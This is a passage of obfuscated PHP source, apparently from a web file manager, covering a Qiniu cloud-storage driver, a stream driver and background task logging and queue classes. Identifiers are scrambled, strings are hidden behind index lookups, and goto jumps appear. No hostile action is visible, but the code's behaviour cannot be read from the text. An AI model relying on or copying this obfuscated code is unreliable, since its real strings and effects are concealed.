$this->fileInfo($ø™³ùª‚[$í“Ê‹[32]], $ËÉ†¾Í, $ø™³ùª‚); } return $ù¶¢…Ğ£; } public function has($øÁİ¨Ï, $Û•­ ÚÑ = false, $ŠÔòê¢ = true) { $’Ç…¦á“ =& $_SERVER[´‹ô¯Œ]; $øÁİ¨Ï = trim($øÁİ¨Ï, $’Ç…¦á“[8]); $¦“ÚÊ¤ = empty($øÁİ¨Ï) && $øÁİ¨Ï !== $’Ç…¦á“[231] ? $’Ç…¦á“[12] : $øÁİ¨Ï . $’Ç…¦á“[8]; $§È¯äòì = $’Ç…¦á“[12]; $­ú—×„ö = 500; $¶šØš° = $’Ç…¦á“[8]; $™õÖç¸” = $–š¸ßØ¥ = 0; while (!0) { check_abort(); list($»–æäæí, $‚¨ôü×) = $this->bucketManager->listFiles($this->bucket, $¦“ÚÊ¤, $§È¯äòì, $­ú—×„ö, $¶šØš°); if ($‚¨ôü×) { break; } $§È¯äòì = array_key_exists($’Ç…¦á“[1501], $»–æäæí) ? $§È¯äòì = $»–æäæí[$’Ç…¦á“[1556]] : $’Ç…¦á“[12]; if ($Û•­ ÚÑ) { if (!empty($»–æäæí[$’Ç…¦á“[1557]])) { $™õÖç¸” += count($»–æäæí[$’Ç…¦á“[1557]]); } if (!empty($»–æäæí[$’Ç…¦á“[1558]])) { $–š¸ßØ¥ += count($»–æäæí[$’Ç…¦á“[1558]]); } if ($§È¯äòì === $’Ç…¦á“[12]) { break; } continue; } if ($ŠÔòê¢) { if (!empty($»–æäæí[$’Ç…¦á“[1557]])) { return !0; } } else { if (!empty($»–æäæí[$’Ç…¦á“[1558]])) { return !0; } } if ($§È¯äòì === $’Ç…¦á“[12]) { break; } } if ($Û•­ ÚÑ) { return array($’Ç…¦á“[242] => $™õÖç¸”, $’Ç…¦á“[243] => $–š¸ßØ¥); } return !1; } public function listAll($šÃÙ¥êæ) { $£—ê–Íš =& $_SERVER[´‹ô¯Œ]; $ŸÒâ±‰ = $this->fileList($šÃÙ¥êæ, $£—ê–Íš[12], !0); $—„ÂöÄø = array_to_keyvalue($ŸÒâ±‰[$£—ê–Íš[86]], $£—ê–Íš[32]); foreach ($ŸÒâ±‰[$£—ê–Íš[85]] as $ØÛş¥èÓ) { if (is_string($ØÛş¥èÓ)) { $—„ÂöÄø[$ØÛş¥èÓ] = array($£—ê–Íš[79] => 0); } } return $this->listAllFiles($šÃÙ¥êæ, $—„ÂöÄø); } private function fileList($ÊÌª›¡, $—Â»ïâå = '', $èäÚöç© = 0) { $ÎÀ³€¬„ =& $_SERVER[´‹ô¯Œ]; $ÊÌª›¡ = trim($ÊÌª›¡, $ÎÀ³€¬„[8]); $ÏÕ‰¢Şü = empty($ÊÌª›¡) && $ÊÌª›¡ !== $ÎÀ³€¬„[231] ? $ÎÀ³€¬„[12] : $ÊÌª›¡ . $ÎÀ³€¬„[8]; $•ÈÅ´™· = $ÎÀ³€¬„[12]; $Á·Ä™¬ª = 1000; $ü´öâšÏ = $–ßŞÔÂõ = array(); while (!0) { check_abort(); list($åœ…®Òš, $ßú€­½) = $this->bucketManager->listFiles($this->bucket, $ÏÕ‰¢Şü, $•ÈÅ´™·, $Á·Ä™¬ª, $—Â»ïâå); if ($ßú€­½) { break; } $•ÈÅ´™· = array_key_exists($ÎÀ³€¬„[1501], $åœ…®Òš) ? $•ÈÅ´™· = $åœ…®Òš[$ÎÀ³€¬„[1556]] : $ÎÀ³€¬„[12]; $ß¨õ“ = isset($åœ…®Òš[$ÎÀ³€¬„[1557]]) ? $åœ…®Òš[$ÎÀ³€¬„[1557]] : array(); $‚¹§¸È = isset($åœ…®Òš[$ÎÀ³€¬„[1558]]) ? $åœ…®Òš[$ÎÀ³€¬„[1558]] : array(); foreach ($ß¨õ“ as $çñÈ•æ) { if ($çñÈ•æ[$ÎÀ³€¬„[97]] == $ÏÕ‰¢Şü) { continue; } $äÍ¯øó = $çñÈ•æ[$ÎÀ³€¬„[97]]; $Ñä³à¬ö = $çñÈ•æ[$ÎÀ³€¬„[1554]]; $çñÈ•æ[$ÎÀ³€¬„[32]] = $äÍ¯øó; $çñÈ•æ[$ÎÀ³€¬„[79]] = $Ñä³à¬ö; $Â–ÃçÃ÷ = $Ñä³à¬ö == 0 && substr($äÍ¯øó, strlen($äÍ¯øó) - 1, 1) == $ÎÀ³€¬„[8] ? !0 : !1; $this->cacheMethodInfoSet($äÍ¯øó, $Â–ÃçÃ÷, $çñÈ•æ); if ($Â–ÃçÃ÷) { $ü´öâšÏ[] = $äÍ¯øó; continue; } $–ßŞÔÂõ[] = $èäÚöç© ? $çñÈ•æ : $äÍ¯øó; } foreach ($‚¹§¸È as $äÍ¯øó) { if ($äÍ¯øó == $ÏÕ‰¢Şü) { continue; } $ü´öâšÏ[] = $äÍ¯øó; $this->cacheMethodInfoSet($äÍ¯øó, !0); } if ($•ÈÅ´™· === $ÎÀ³€¬„[12]) { break; } } $this->cacheMethodInfoSet($ÊÌª›¡, !0); return array($ÎÀ³€¬„[85] => $ü´öâšÏ, $ÎÀ³€¬„[86] => $–ßŞÔÂõ); } public function canRead($ÄÌ”¯¢) { return $this->exist($ÄÌ”¯¢) ? !0 : !1; } public function canWrite($Â Ù°Ôº) { return $this->exist($Â Ù°Ôº) ? !0 : !1; } public function getContent($†ñâò›ª) { return $this->fileSubstr($†ñâò›ª, 0, -1); } public function setContent($ş‘÷¨ˆÏ, $Õ‘Œ³‡Ô = '') { $ÌÅàæ„á = $this->tempFile($this->pathThis($ş‘÷¨ˆÏ)); file_put_contents($ÌÅàæ„á, $Õ‘Œ³‡Ô); if ($this->upload($ş‘÷¨ˆÏ, $ÌÅàæ„á)) { $this->tempFileRemve($ÌÅàæ„á); return !0; } return !1; } public function refreshUrls($§–…°öÖ) { $º’…­— =& $_SERVER[´‹ô¯Œ]; $ä¿»Ù×ù = array(); if (is_array($§–…°öÖ)) { foreach ($§–…°öÖ as $îôÎû¥) { $ä¿»Ù×ù[] = $this->link($îôÎû¥); } } else { $ä¿»Ù×ù[] = $this->link($§–…°öÖ); } $”ìı·’¡ = new Qiniu\Cdn\CdnManager($this->auth); list($©âíŸ‘, $€›Á£ÎŒ) = $”ìı·’¡->refreshUrls($ä¿»Ù×ù); if ($€›Á£ÎŒ) { return !1; } return $©âíŸ‘[$º’…­—[1281]] == $º’…­—[845] ? !0 : !1; } public function fileSubstr($©ĞÆš¹, $çâ÷›ƒƒ, $Ïºã»·) { $ãÏÆî‚ =& $_SERVER[´‹ô¯Œ]; if (!($¤¥Úç£š = $this->link($©ĞÆš¹))) { return !1; } $œ˜•¿‡¥ = !1; if ($Ïºã»· > 0) { $ØõÕø = $çâ÷›ƒƒ + $Ïºã»· - 1; $œ˜•¿‡¥ = array($ãÏÆî‚[1559] . $çâ÷›ƒƒ . $ãÏÆî‚[465] . $ØõÕø); } $¬Ş„İÍù = url_request($¤¥Úç£š, $ãÏÆî‚[1520], !1, $œ˜•¿‡¥); return $¬Ş„İÍù[$ãÏÆî‚[836]] ? $¬Ş„İÍù[$ãÏÆî‚[1304]] : !1; } public function upload($¥ÓŒÏ¥, $Æ©ÔÙ“, $èŒœÊ˜Ü = false, $©¾ğ‰øù = REPEAT_REPLACE) { $ÖèÌˆ½™ = new Qiniu\Storage\UploadManager(); $ˆÁğœ±„ = $this->auth->uploadToken($this->bucket, $¥ÓŒÏ¥); $† ³æ‚‘ = get_file_mime(get_path_ext($Æ©ÔÙ“)); list($Ÿ±ìÀÕ, $®òÊîëş) = $ÖèÌˆ½™->putFile($ˆÁğœ±„, $¥ÓŒÏ¥, $Æ©ÔÙ“, null, $† ³æ‚‘); return $®òÊîëş ? !1 : $this->getPathOuter($¥ÓŒÏ¥); } public function uploadFormData($¦¡Ÿ€Û, $ºÀ–Óë = 3600) { return $this->uploadToken($¦¡Ÿ€Û, $ºÀ–Óë); } public function uploadMultiData($µÓ•î°¹, $Ç»Éç¸ñ = 3600) { return $this->uploadToken($µÓ•î°¹, $Ç»Éç¸ñ); } private function uploadToken($»¸ø¯‰ñ, $áÀØûÇ = 3600) { $¦ŒŞ Í =& $_SERVER[´‹ô¯Œ]; $ïİ†Ã² = $áÀØûÇ; $ã «¥é­ = array($¦ŒŞ Í[1560] => $¦ŒŞ Í[1561]); $¨÷Ü¾²¶ = $»¸ø¯‰ñ; $©Œ¡úİˆ = $this->auth->uploadToken($this->bucket, $¨÷Ü¾²¶, $ïİ†Ã², $ã «¥é­, !0); $Öó†µñ› = empty($this->region) || $this->region == $¦ŒŞ Í[1562] ? $¦ŒŞ Í[12] : $¦ŒŞ Í[465] . $this->region; $¶úŸ²¦¼ = http_type() . "\x3a\x2f\x2f\165\160\154\157\141\144{$Öó†µñ›}\x2e\161\151\156\151\165\160\56\143\157\155\x2f"; return array($¦ŒŞ Í[1563] => $©Œ¡úİˆ, $¦ŒŞ Í[1564] => $¶úŸ²¦¼); } public function download($½ıËªÏò, $ó•¬ûûÍ) { $ÀÇ×ÎÈÁ = IO::getPathInner(IO::mkfile($ó•¬ûûÍ)); if (!($¬˜Î¯Í = $this->link($½ıËªÏò))) { return !1; } $âÇî€Çˆ = 0; $á¸¤¹Îº = 1024 * 200; $³†µé¢¤ = fopen($ÀÇ×ÎÈÁ, $_SERVER[´‹ô¯Œ][1565]); while (!0) { $»ê©Âî = $this->fileSubstr($½ıËªÏò, $âÇî€Çˆ, $á¸¤¹Îº); if ($»ê©Âî === !1) { return !1; } fwrite($³†µé¢¤, $»ê©Âî); $âÇî€Çˆ += $á¸¤¹Îº; if (strlen($»ê©Âî) < $á¸¤¹Îº) { break; } } fclose($³†µé¢¤); return $ó•¬ûûÍ; } public function link($í‡ıİÂÜ, $ ç·Àş’ = '') { if (!$this->isFile($í‡ıİÂÜ)) { return !1; } $ÆÓœ¥ô¼ = $this->getHost() . $_SERVER[´‹ô¯Œ][8] . $this->pathEncode($í‡ıİÂÜ) . $ ç·Àş’; return $this->auth->privateDownloadUrl($ÆÓœ¥ô¼, 3600 * 12); } public function fileOut($µö”ØŠÙ, $Àé¤ãÅ™ = false, $óéûñË˜ = false, $ƒëê‰ª° = '') { $¹Ü«¢ìØ =& $_SERVER[´‹ô¯Œ]; if ($this->isFileOutServer()) { return $this->fileOutServer($µö”ØŠÙ, $Àé¤ãÅ™, $óéûñË˜, $ƒëê‰ª°); } if (!$óéûñË˜) { $óéûñË˜ = $this->pathThis($µö”ØŠÙ); } $Ûµ€’”ø = $Àé¤ãÅ™ ? $¹Ü«¢ìØ[1566] . rawurlencode($óéûñË˜) : $¹Ü«¢ìØ[12]; $İ†ÉÚğ¬ = $this->link($µö”ØŠÙ, $Ûµ€’”ø); $this->fileOutLink($İ†ÉÚğ¬); } public function fileOutServer($¸ğÔËúè, $°ßµ¬Ó× = false, $ıî€Ù¯Î = false, $’æºÕÛ¥ = '') { parent::fileOut($¸ğÔËúè, $°ßµ¬Ó×, $ıî€Ù¯Î, $’æºÕÛ¥); } public function fileOutImage($á„ò¿Ì, $¤Ä‰’ÖÜ = 250) { if ($this->size($á„ò¿Ì) > 1024 * 1024 * 20) { return $this->fileOutImageServer($á„ò¿Ì, $¤Ä‰’ÖÜ); } $“®Û¿Ã„ = $this->link($á„ò¿Ì, $_SERVER[´‹ô¯Œ][1567] . $¤Ä‰’ÖÜ); $this->fileOutLink($“®Û¿Ã„); } public function fileOutImageServer($¬áêƒÃá, $¹¨Ó ó = 250) { parent::fileOutImage($¬áêƒÃá, $¹¨Ó ó); } public function hashMd5($Í†Ş’ïÓ) { $ñ§¤Ğºæ =& $_SERVER[´‹ô¯Œ]; $úÏû¥üø = $this->objectMeta($Í†Ş’ïÓ); return isset($úÏû¥üø[$ñ§¤Ğºæ[248]]) ? $úÏû¥üø[$ñ§¤Ğºæ[248]] : !1; $†ëßéÍ = $this->link($Í†Ş’ïÓ, $ñ§¤Ğºæ[1568]); } public function size($é“³ÒÈØ) { $ùÔÉÙÔ° = $this->objectMeta($é“³ÒÈØ); return $ùÔÉÙÔ° ? $ùÔÉÙÔ°[$_SERVER[´‹ô¯Œ][79]] : 0; } public function info($Îû¶È¥à) { if ($this->isFolder($Îû¶È¥à)) { return $this->folderInfo($Îû¶È¥à); } else { if ($this->isFile($Îû¶È¥à)) { return $this->fileInfo($Îû¶È¥à); } } return !1; } public function exist($ßŠÙÀ¥â) { return $this->isFile($ßŠÙÀ¥â) || $this->isFolder($ßŠÙÀ¥â); } public function isFile($¶¬…ò¯Ù) { return !$this->isFolder($¶¬…ò¯Ù) && $this->objectMeta($¶¬…ò¯Ù); } public function isFolder($€ÄÖû¿Ã) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][180], $€ÄÖû¿Ã); } protected function objectMeta($ĞâÙ¯ı) { return $this->cacheMethod($_SERVER[´‹ô¯Œ][182], $ĞâÙ¯ı); } protected function _objectMeta($İûãäÙç) { $íª˜”õĞ =& $_SERVER[´‹ô¯Œ]; list($®©ÂÍÉÃ, $ú¤‰²¤Ì) = $this->bucketManager->stat($this->bucket, $İûãäÙç); if ($®©ÂÍÉÃ) { $®©ÂÍÉÃ[$íª˜”õĞ[79]] = intval($®©ÂÍÉÃ[$íª˜”õĞ[1554]]); } return $®©ÂÍÉÃ; } protected function _isFolder($ˆÒÖâ’¦) { $áøûŠüÂ =& $_SERVER[´‹ô¯Œ]; if ($ˆÒÖâ’¦ == $áøûŠüÂ[12] || $ˆÒÖâ’¦ == $áøûŠüÂ[8]) { return !0; } list($Ñ™§ôò, $¿ª‘Îçİ) = $this->bucketManager->listFiles($this->bucket, trim($ˆÒÖâ’¦, $áøûŠüÂ[8]) . $áøûŠüÂ[8], $áøûŠüÂ[12], 1, $áøûŠüÂ[8]); return !empty($Ñ™§ôò[$áøûŠüÂ[1557]]) || !empty($Ñ™§ôò[$áøûŠüÂ[1558]]) ? !0 : !1; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($‚šĞıÔã, $—¼Øª´â = 0) { parent::__construct(); $this->source = $‚šĞıÔã; $this->sourceSize = $—¼Øª´â; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ëÆ„î¨ = false) { return $this->sourceSize; } public function getContent($¸ïæç“Ù = false) { return $this->fileSubstr($¸ïæç“Ù, 0, $this->sourceSize); } public function fileSubstr($²ËŸû÷ = false, $Ïş‹ÚÏ‘ = 0, $äè“ñÉ± = 0) { if (!$äè“ñÉ±) { $äè“ñÉ± = $this->sourceSize; } $Üü¦šÛ„ = $this->sourceSize - $Ïş‹ÚÏ‘; if ($äè“ñÉ± >= $Üü¦šÛ„) { $äè“ñÉ± = $Üü¦šÛ„; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ïş‹ÚÏ‘, $äè“ñÉ±); } if ($this->sourceType == self::TYPE_FILE) { if ($äè“ñÉ± <= 0) { return $_SERVER[´‹ô¯Œ][12]; } $öÆ‘³ = ftell($this->source); fseek_64($this->source, $öÆ‘³ + $Ïş‹ÚÏ‘); $ìÄ˜éò¦ = @fread($this->source, $äè“ñÉ±); fseek_64($this->source, $öÆ‘³); return $ìÄ˜éò¦; } } public function hashMd5($÷İÑ–¤“ = false) { return md5($this->getContent()); } public static function hash($ó¿¬°‘, $¯‘Î¬¿ = 0) { $ª ğÌ¶â = new PathDriverStream($ó¿¬°‘, $¯‘Î¬¿); return $ª ğÌ¶â->hashSimple($ó¿¬°‘); } public static function md5($ƒ§°å¾µ, $Öş³µåÑ = 0) { $“£†¿Å´ = new PathDriverStream($ƒ§°å¾µ, $Öş³µåÑ); return $“£†¿Å´->hashMd5($ƒ§°å¾µ); } } goto cØ´Ğ…Ü²; eŞˆ‹ëñÚ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($€Ö–ô, $ùÑåãê = '', $ÆÁ•”¥£ = 0, $ÈĞøÁ·¡ = '') { $‰ÉóÁëô =& $_SERVER[´‹ô¯Œ]; $ÈĞøÁ·¡ = $ÈĞøÁ·¡ ? $ÈĞøÁ·¡ : ($ùÑåãê ? $ùÑåãê : $€Ö–ô); $šÒø›§û = new Task($€Ö–ô, $ùÑåãê, $ÆÁ•”¥£, $ÈĞøÁ·¡); $GLOBALS[$‰ÉóÁëô[1880] . $€Ö–ô] = new TaskLog($‰ÉóÁëô[1779], $šÒø›§û, $ÈĞøÁ·¡); return $šÒø›§û; } public function __construct($şáûÏú = '', $ş÷÷ñ©© = '', $ÒøÚ¿²¿ = '') { $¼¸»ĞÌ =& $_SERVER[´‹ô¯Œ]; if (!$şáûÏú) { $şáûÏú = $¼¸»ĞÌ[1779]; } $ÓŠò­Ûã = $şáûÏú . $¼¸»ĞÌ[465] . rand_string(10); if (!$ÒøÚ¿²¿) { $ÒøÚ¿²¿ = $şáûÏú . $¼¸»ĞÌ[53] . $ÒøÚ¿²¿; } switch ($şáûÏú) { case $¼¸»ĞÌ[1779]: if (!$ş÷÷ñ©© || !$ş÷÷ñ©©->task) { return echoLog($şáûÏú . $¼¸»ĞÌ[1881]); } $÷œ…–¨Ú = $ş÷÷ñ©©; $ÓŠò­Ûã = $÷œ…–¨Ú->task[$¼¸»ĞÌ[487]]; $şáûÏú = $÷œ…–¨Ú->task[$¼¸»ĞÌ[487]]; if (!$÷œ…–¨Ú->task[$¼¸»ĞÌ[1684]]) { $÷œ…–¨Ú->task[$¼¸»ĞÌ[1684]] = $ÒøÚ¿²¿ ? $ÒøÚ¿²¿ : $şáûÏú; } break; case $¼¸»ĞÌ[1882]: if (!$ş÷÷ñ©©) { return echoLog($şáûÏú . $¼¸»ĞÌ[1883]); } $ÍÍÀî© = is_string($ş÷÷ñ©©) ? array($ş÷÷ñ©©) : $ş÷÷ñ©©; $÷œ…–¨Ú = new TaskFileTransfer($ÓŠò­Ûã, $şáûÏú, 0, $ÒøÚ¿²¿ ? $ÒøÚ¿²¿ : $ÍÍÀî©[0]); foreach ($ÍÍÀî© as $Æ‘ÅÙ) { $÷œ…–¨Ú->addPath($Æ‘ÅÙ); } break; case $¼¸»ĞÌ[391]: if (!$ş÷÷ñ©©) { return echoLog($şáûÏú . $¼¸»ĞÌ[1883]); } $ÍÍÀî© = is_string($ş÷÷ñ©©) ? array($ş÷÷ñ©©) : $ş÷÷ñ©©; $÷œ…–¨Ú = new TaskZip($ÓŠò­Ûã, $şáûÏú, 0, $ÒøÚ¿²¿ ? $ÒøÚ¿²¿ : $ÍÍÀî©[0]); foreach ($ÍÍÀî© as $Æ‘ÅÙ) { $÷œ…–¨Ú->addPath($Æ‘ÅÙ); } break; case $¼¸»ĞÌ[1316]: if (!$ş÷÷ñ©©) { return echoLog($şáûÏú . $¼¸»ĞÌ[1883]); } $÷œ…–¨Ú = new TaskUnZip($ÓŠò­Ûã, $şáûÏú, 0, $ÒøÚ¿²¿ ? $ÒøÚ¿²¿ : $ş÷÷ñ©©); if ($ş÷÷ñ©©) { $÷œ…–¨Ú->addFile($ş÷÷ñ©©); } break; case $¼¸»ĞÌ[152]: $÷œ…–¨Ú = new TaskHttp($ÓŠò­Ûã, $şáûÏú); break; default: return; break; } $this->task = $÷œ…–¨Ú; $this->taskID = $ÓŠò­Ûã; Hook::bind($¼¸»ĞÌ[1817], array($this, $¼¸»ĞÌ[1884])); Hook::bind($¼¸»ĞÌ[1819], array($this, $¼¸»ĞÌ[1885])); Hook::bind($¼¸»ĞÌ[1813], array($this, $¼¸»ĞÌ[1886])); echoLog($¼¸»ĞÌ[1887] . $÷œ…–¨Ú->task[$¼¸»ĞÌ[1684]]); } public function __destruct() { $this->end(); } public function end($’âäê¤ = '') { $Ù±¥ß  =& $_SERVER[´‹ô¯Œ]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($’âäê¤); $this->task = !1; $this->taskID = !1; Hook::unbind($Ù±¥ß [1817], array($this, $Ù±¥ß [1884])); Hook::unbind($Ù±¥ß [1819], array($this, $Ù±¥ß [1885])); Hook::unbind($Ù±¥ß [1813], array($this, $Ù±¥ß [1886])); } public function taskUpdate($ƒÑæøñä) { $‰êÂÅñš =& $_SERVER[´‹ô¯Œ]; if (!$ƒÑæøñä || $this->taskID != $ƒÑæøñä[$‰êÂÅñš[487]]) { return; } $¾²ÁÂÒë = 20; $ã½ÒÀÖ = intval($ƒÑæøñä[$‰êÂÅñš[1798]] * $¾²ÁÂÒë); $û´´³ = $‰êÂÅñš[176] . str_repeat($‰êÂÅñš[518], $ã½ÒÀÖ) . $‰êÂÅñš[1106] . str_repeat($‰êÂÅñš[53], $¾²ÁÂÒë - $ã½ÒÀÖ) . $‰êÂÅñš[178]; $ô…ôÀ = $û´´³ . sprintf($‰êÂÅñš[1888], $ƒÑæøñä[$‰êÂÅñš[1798]] * 100) . $‰êÂÅñš[1889]; $¸ØÚÇèù = $ô…ôÀ . $ƒÑæøñä[$‰êÂÅñš[1797]] . $‰êÂÅñš[8] . $ƒÑæøñä[$‰êÂÅñš[1155]] . LNG($‰êÂÅñš[1890]); $¡™ûÆÄµ = $‰êÂÅñš[12]; if ($ƒÑæøñä[$‰êÂÅñš[1874]]) { $¸ØÚÇèù = $ô…ôÀ . size_format($ƒÑæøñä[$‰êÂÅñš[1797]]) . $‰êÂÅñš[8] . size_format($ƒÑæøñä[$‰êÂÅñš[1155]]); $¡™ûÆÄµ = size_format($ƒÑæøñä[$‰êÂÅñš[1799]]) . $‰êÂÅñš[1891]; } if ($ƒÑæøñä[$‰êÂÅñš[1157]]) { $ƒÑæøñä[$‰êÂÅñš[1848]] = $ƒÑæøñä[$‰êÂÅñš[1157]] . $‰êÂÅñš[53] . $ƒÑæøñä[$‰êÂÅñš[1848]]; } if ($ƒÑæøñä[$‰êÂÅñš[1848]]) { $’›®ğó = $‰êÂÅñš[12]; if ($ƒÑæøñä[$‰êÂÅñš[1850]]) { $’›®ğó = $‰êÂÅñš[50] . size_format($ƒÑæøñä[$‰êÂÅñš[1851]]) . $‰êÂÅñš[8] . size_format($ƒÑæøñä[$‰êÂÅñš[1850]]); } $¡™ûÆÄµ .= $ƒÑæøñä[$‰êÂÅñš[1848]] . $’›®ğó; } if ($ƒÑæøñä[$‰êÂÅñš[849]] && !$ƒÑæøñä[$‰êÂÅñš[1850]]) { $¡™ûÆÄµ .= $‰êÂÅñš[53] . size_format($ƒÑæøñä[$‰êÂÅñš[1855]]) . $‰êÂÅñš[8] . size_format($ƒÑæøñä[$‰êÂÅñš[849]]); } echoLog($¸ØÚÇèù . $‰êÂÅñš[53] . $¡™ûÆÄµ, !0); } public function taskEnd($Ãê„²¯œ) { $ğå¨æ¤ =& $_SERVER[´‹ô¯Œ]; if (!$Ãê„²¯œ || $this->taskID != $Ãê„²¯œ[$ğå¨æ¤[487]]) { return; } $û ›áË¶ = $Ãê„²¯œ ? LNG($ğå¨æ¤[1892]) . $ğå¨æ¤[4] . $Ãê„²¯œ[$ğå¨æ¤[1797]] . $ğå¨æ¤[8] . $Ãê„²¯œ[$ğå¨æ¤[1155]] . LNG($ğå¨æ¤[1890]) . $ğå¨æ¤[74] : $ğå¨æ¤[12]; echoLog($ğå¨æ¤[1893] . $Ãê„²¯œ[$ğå¨æ¤[1684]] . ($Ãê„²¯œ[$ğå¨æ¤[538]] ? $ğå¨æ¤[74] . $Ãê„²¯œ[$ğå¨æ¤[538]] : $ğå¨æ¤[12]) . $ğå¨æ¤[74] . $û ›áË¶ . $ğå¨æ¤[1894] . sprintf($ğå¨æ¤[943], timeFloat() - $Ãê„²¯œ[$ğå¨æ¤[1800]]) . $ğå¨æ¤[1812]); $this->end(); } public function taskKill($ˆ¿Øå€÷) { $ôıìõ¿ç =& $_SERVER[´‹ô¯Œ]; if (!$ˆ¿Øå€÷ || $this->taskID != $ˆ¿Øå€÷[$ôıìõ¿ç[487]]) { return; } echoLog($ôıìõ¿ç[1895] . $ˆ¿Øå€÷[$ôıìõ¿ç[1684]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\141\x73\x6b\121\x75\x65\x75\145\x4c\145\x6e\147\164\150"; const QUEUE_DATA = "\x74\141\x73\153\x51\x75\x65\x75\x65\x44\x61\164\x61"; const QUEUE_TIME = "\x74\141\163\x6b\x51\x75\x65\165\x65\114\141\163\164\122\x75\156"; const QUEUE_THREAD = "\164\141\x73\x6b\121\165\x65\x75\145\124\150\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ÄÍÕ±ú, $Ç ÂõçÑ = array(), $…®ÒÊú = '', $ëš“œÉà = '') { $¼ÛçøÓú =& $_SERVER[´‹ô¯Œ]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ëš“œÉà && array_find_by_field(self::$listData, $¼ÛçøÓú[97], $ëš“œÉà)) { return !0; } if ($ëš“œÉà && array_find_by_field(self::$listDataAdd, $¼ÛçøÓú[97], $ëš“œÉà)) { return !0; } self::$listDataAdd[] = array($¼ÛçøÓú[344] => $ÄÍÕ±ú, $¼ÛçøÓú[1896] => $Ç ÂõçÑ, $¼ÛçøÓú[538] => $…®ÒÊú, $¼ÛçøÓú[97] => $ëš“œÉà); return !0; } public static function addSubmit() { $²ÍâÁåõ =& $_SERVER[´‹ô¯Œ]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($²ÍâÁåõ[1897] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $²ÍâÁåõ[12], $²ÍâÁåõ[538])), $²ÍâÁåõ[198]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($°›ù§Â—, $òÁ—ªÅ€ = array(), $È®±Ìş† = '', $”ã¼Ê®ã = '') { $¿ëé¥¿ù =& $_SERVER[´‹ô¯Œ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $½‰½Èî = self::getAll(); if ($”ã¼Ê®ã && array_find_by_field($½‰½Èî, $¿ëé¥¿ù[97], $”ã¼Ê®ã)) { return !0; } $½‰½Èî[] = array($¿ëé¥¿ù[344] => $°›ù§Â—, $¿ëé¥¿ù[1896] => $òÁ—ªÅ€, $¿ëé¥¿ù[538] => $È®±Ìş†, $¿ëé¥¿ù[97] => $”ã¼Ê®ã); self::setAll($½‰½Èî); write_log($¿ëé¥¿ù[1897] . $È®±Ìş†, $¿ëé¥¿ù[198]); return !0; } public static function run() { $º»ÀÒ =& $_SERVER[´‹ô¯Œ]; $½²õóÉû = self::getAll(); $ê¿¦Âª† = array_shift($½²õóÉû); if (!$ê¿¦Âª†) { return !1; } self::setAll($½²õóÉû); $”Á™ÜÉº = timeFloat(); $‹’Û¤’Í = $º»ÀÒ[12]; try { $‹’Û¤’Í = Hook::apply($ê¿¦Âª†[$º»ÀÒ[344]], $ê¿¦Âª†[$º»ÀÒ[1896]]); } catch (Exception $¿âµ’Ú) { write_log($¿âµ’Ú, $º»ÀÒ[1281]); } $áöø™ï = number_format(timeFloat() - $”Á™ÜÉº, 3) . $º»ÀÒ[1812]; if ($‹’Û¤’Í && is_string($‹’Û¤’Í)) { $áöø™ï = $áöø™ï . $º»ÀÒ[1898] . $‹’Û¤’Í; } write_log($º»ÀÒ[1899] . $ê¿¦Âª†[$º»ÀÒ[538]] . $º»ÀÒ[1900] . $áöø™ï, $º»ÀÒ[198]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $ÓğçÁê„ =& $_SERVER[´‹ô¯Œ]; $€­ÁÕ¯Ÿ = self::threadCount() + 1; if ($€­ÁÕ¯Ÿ > 3 || !self::count()) { return; } write_log($ÓğçÁê„[1901] . $€­ÁÕ¯Ÿ, $ÓğçÁê„[198]); Cache::set(self::QUEUE_THREAD, $€­ÁÕ¯Ÿ, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($ÓğçÁê„[1902], $ÓğçÁê„[198]); } public static function getKey($Ü‡½¢, $·°–§÷¼ = "\151\156\x74") { $¾õŠ§Œò =& $_SERVER[´‹ô¯Œ]; Cache::removeMemory($Ü‡½¢); $©ì²‡Ò¿ = Cache::get($Ü‡½¢); if ($·°–§÷¼ == $¾õŠ§Œò[366]) { return $©ì²‡Ò¿ ? intval($©ì²‡Ò¿) : 0; } if ($·°–§÷¼ == $¾õŠ§Œò[1903]) { return is_array($©ì²‡Ò¿) ? $©ì²‡Ò¿ : array(); } return $©ì²‡Ò¿; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[´‹ô¯Œ][1903]); } public static function setAll($éşŸÛõ’) { $€†ëˆŸ‘ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($éşŸÛõ’), $€†ëˆŸ‘); Cache::set(self::QUEUE_DATA, $éşŸÛõ’, $€†ëˆŸ‘); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($âö’ã, $ìÌ¦¯€ = 5.0) { if (!$âö’ã) { return; } $ÌòªìÊ = Cache::get($âö’ã); if (!$ÌòªìÊ || timeFloat() - floatVal($ÌòªìÊ) >= $ìÌ¦¯€) { Cache::set($âö’ã, timeFloat(), $ìÌ¦¯€ * 